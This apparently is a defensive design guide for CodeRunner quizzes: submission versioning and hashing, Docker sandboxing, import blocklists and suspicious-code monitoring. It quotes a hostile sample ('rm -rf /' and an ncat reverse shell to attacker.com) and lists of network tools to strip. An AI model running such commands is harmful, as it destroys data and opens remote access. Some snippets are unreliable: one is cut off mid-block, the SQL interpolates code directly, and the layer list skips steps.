HANDLING STUDENT CODE & EXTERNAL ATTACKS
========================================

=== THREAT 1: STUDENT CHANGING CODE (CHEATING) ===

Problem: Student submits code, then later modifies it to look better
- Student submits Code A (wrong)
- Student sees correct answer from another student
- Student changes their submission to Code B (copied)
- How do we prevent this?

Solution 1: IMMUTABLE SUBMISSION WITH VERSIONING
===============================================

Store complete history:
- Timestamp of EVERY submission
- Code content of EVERY version
- Who submitted (user ID)
- IP address of submission
- Browser information

Database structure:
```
quiz_attempt_codes (new table):
- id
- attempt_id (FK to quiz_attempt)
- userid (FK to user)
- version_number
- code_submitted
- timestamp
- ip_address
- user_agent
- is_final (0 or 1)
- previous_code_hash
```

After submission, lock the code:
```php
// Once code is submitted, mark as final
UPDATE quiz_attempt_codes SET is_final = 1 WHERE attempt_id = 123 AND version_number = 5;

// Any further edits create new version
INSERT INTO quiz_attempt_codes (attempt_id, version_number, code_submitted, is_final)
VALUES (123, 6, 'new_code...' , 0);
```

Benefits:
✓ Complete audit trail of all changes
✓ Can see if code was modified after grading
✓ Timestamp prevents backdating claims
✓ Teacher can revert to any version and re-grade

Solution 2: CODE HASHING & TAMPERING DETECTION
==============================================

Create immutable proof of submission:
```php
$code = "student_code_here";
$code_hash = hash('sha256', $code);  // Cryptographic hash

// Store both code AND hash
INSERT INTO quiz_attempt_codes 
(attempt_id, code_submitted, code_hash, timestamp, signed)
VALUES (123, '$code', '$code_hash', NOW(), sign_with_key('$code_hash'));

// Later, verify code hasn't been modified:
$stored_hash = 'abc123def456...';
$current_hash = hash('sha256', $code_from_db);
if ($stored_hash !== $current_hash) {
    echo "⚠️ CODE HAS BEEN TAMPERED WITH!";
}
```

Benefits:
✓ Cryptographic proof code wasn't modified
✓ Digital signature prevents admin manipulation
✓ One-way hash (can't reverse engineer original)
✓ Detects even single character changes

Solution 3: FREEZE SUBMISSIONS AFTER DUE DATE
==============================================

Once due date passes:
1. Mark submission as FINAL
2. Disable editing
3. Lock discussion/peer review

```php
// In Moodle quiz integrity check:
if ($submission->date > $quiz->duedate) {
```

Benefits:
✓ Prevents post-deadline changes
✓ Logs any modification attempts

=== THREAT 2: EXTERNAL ATTACKER CODE (MALICIOUS CODE) ===

Problem: Attacker submits code like:
```python
import os
os.system('rm -rf /')  # Delete everything!
os.system('ncat attacker.com')  # Reverse shell
```

Solution 1: CODE SANDBOXING (STRONGEST)
=======================================

Run code in isolated Docker container:

```dockerfile
# Dockerfile for CodeRunner sandbox
FROM python:3.11-slim

# Remove dangerous tools
RUN apt-get update && apt-get remove -y curl wget nc netcat openssh-client

# Create unprivileged user
RUN useradd -m -u 1000 student

# Set resource limits
COPY limits.conf /etc/security/limits.d/student.conf

# Copy only standard library
COPY safe_python.py /app/

USER student
WORKDIR /app

# Run code with timeout
ENTRYPOINT ["timeout", "5"]
CMD ["python3"]
```

Run code in sandbox:
```php
$cmd = "docker run --rm --memory=256m --cpu-shares=512 " .
       "--net=none --cap-drop=ALL " .
       "coderunner-sandbox python /code.py";

exec($cmd, $output, $return_code);
```

Benefits:
✓ Complete isolation - malicious code can't escape
✓ No network access (--net=none)
✓ Memory limited (256MB max)
✓ CPU limited
✓ No capabilities (can't spawn processes)
✓ Limited to 5 second timeout
✓ Even if hacked, only that container affected

Solution 2: WHITELIST ALLOWED IMPORTS
====================================

Only allow "safe" Python libraries:

```python
ALLOWED_IMPORTS = [
    're',           # regex
    'string',       # string operations
    'math',         # math functions
    'random',       # random numbers
    'datetime',     # date/time
    'json',         # JSON parsing
]

DANGEROUS_IMPORTS = [
    'os',           # OS commands
    'subprocess',   # Process execution
    'sys',          # System access
    'socket',       # Network
    'requests',     # HTTP
    '__import__',   # Dynamic imports
]
```

Validation code:
```php
function validate_code($code) {
    // Check for dangerous imports
    if (preg_match('/import\s+(os|subprocess|sys|socket|requests)/', $code)) {
        return false; // Rejected
    }
    
    // Check for dangerous functions
    if (preg_match('/\b(exec|eval|compile|__import__|open)\s*\(/', $code)) {
        return false; // Rejected
    }
    
    // Check for shell commands
    if (preg_match('/os\.(system|popen|exec)/', $code)) {
        return false; // Rejected
    }
    
    return true; // OK
}
```

Benefits:
✓ Prevents import of dangerous modules
✓ Stops system calls
✓ Stops file access attacks
✓ Simple to implement
⚠️ Less flexible (some legitimate code rejected)

Solution 3: STATIC CODE ANALYSIS (AST PARSING)
=============================================

Parse code abstract syntax tree to detect dangerous patterns:

```php
function analyze_code_ast($code) {
    $dangerous_patterns = [
        'exec', 'eval', 'compile',  // Code execution
        'open', 'file',             // File access
        'socket', 'urllib',         // Network
        'subprocess', 'os.system',  // Shell access
        '__import__',               // Dynamic imports
    ];
    
    foreach ($dangerous_patterns as $pattern) {
        if (preg_match("/\b$pattern\b/i", $code)) {
            return [
                'safe' => false,
                'reason' => "Potentially dangerous: $pattern",
                'line' => get_line_number($code, $pattern)
            ];
        }
    }
    
    return ['safe' => true];
}
```

Benefits:
✓ More intelligent than simple string matching
✓ Detects variations (os.popen, os.exec, etc.)
✓ Shows line numbers of problems
✓ Reduces false positives

Solution 4: INPUT/OUTPUT FILTERING
==================================

Sanitize what code receives and outputs:

```php
// Restrict stdin to safe characters only
function sanitize_input($input) {
    // Allow only ASCII letters, numbers, spaces, newlines
    $input = preg_replace('/[^\x20-\x7E\n\r\t]/', '', $input);
    
    // Limit size
    if (strlen($input) > 100000) {
        $input = substr($input, 0, 100000);
    }
    
    return $input;
}

// Filter output to prevent injection attacks
function sanitize_output($output) {
    // Remove null bytes
    $output = str_replace("\x00", '', $output);
    
    // Limit size
    if (strlen($output) > 50000) {
        $output = substr($output, 0, 50000) . "[OUTPUT TRUNCATED]";
    }
    
    // Escape for HTML/JSON
    return htmlspecialchars($output, ENT_QUOTES, 'UTF-8');
}
```

Benefits:
✓ Prevents injection attacks
✓ Limits resource consumption
✓ Cleans malformed data
✓ Safe to display to users

Solution 5: EXECUTION MONITORING & ALERTS
=========================================

Monitor suspicious execution patterns:

```php
function detect_suspicious_execution($code, $execution_data) {
    $suspicious = [];
    
    // Check for infinite loops (very short execution on large code)
    if (strlen($code) > 10000 && $execution_data['duration'] < 0.1) {
        $suspicious[] = 'Possible optimizer evasion';
    }
    
    // Check for excessive error rate
    if ($execution_data['errors'] > 10) {
        $suspicious[] = 'Too many errors - possible attack';
    }
    
    // Check for network activity (if in sandbox)
    if (preg_match('/socket\.|requests\./', $code)) {
        $suspicious[] = 'Network access attempted';
    }
    
    // Check for file operations
    if (preg_match('/open\(|read\(|write\(/', $code)) {
        $suspicious[] = 'File system access attempted';
    }
    
    return $suspicious;
}

// Log and alert on suspicious activity
if (!empty($suspicious_results)) {
    log_security_event('SUSPICIOUS_CODE_SUBMISSION', [
        'user_id' => $userid,
        'questions' => $suspicious_results,
        'timestamp' => time(),
        'code_snippet' => substr($code, 0, 200)
    ]);
    
    // Alert admin
    send_admin_alert("Suspicious code submission from user $userid");
}
```

Benefits:
✓ Detects attack patterns
✓ Alerts on suspicious behavior
✓ Creates security audit trail
✓ Helps identify repeat attackers

Here's the recommended multi-layer defense:

Layer 1: STUDENT INTEGRITY
├─ Code versioning (store all changes)

├─ Resource limits (memory, CPU, time)
├─ Network isolation (--net=none)
├─ Capability dropping (--cap-drop=ALL)
└─ Time limit (5 second timeout)

Layer 4: OUTPUT PROTECTION
├─ Size limits (max 50KB output)
├─ Character filtering (safe characters only)
├─ HTML escaping (prevent injection)
└─ Logging (track all executions)
